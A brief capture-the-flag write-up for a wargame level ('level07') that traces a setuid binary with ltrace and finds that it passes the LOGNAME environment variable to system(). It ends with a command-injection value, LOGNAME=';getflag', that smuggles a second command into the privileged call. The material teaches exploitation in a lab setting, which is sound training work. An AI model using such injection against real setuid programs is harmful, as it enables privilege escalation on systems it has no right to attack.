by inspecting the level07 binary with ltrace we can see that the binary is executing with setuid permission:
	setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                        = 0
	setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                        = 0
then we see that LOGNAME env variable is acceded and reuse with /usr/bin/echo:
	getenv("LOGNAME")                                                          = "flag07"
	system("/bin/echo flag07 "flag07
so we juste have to set our own LOGNAME with 
	LOGNAME=';getflag' ./level07
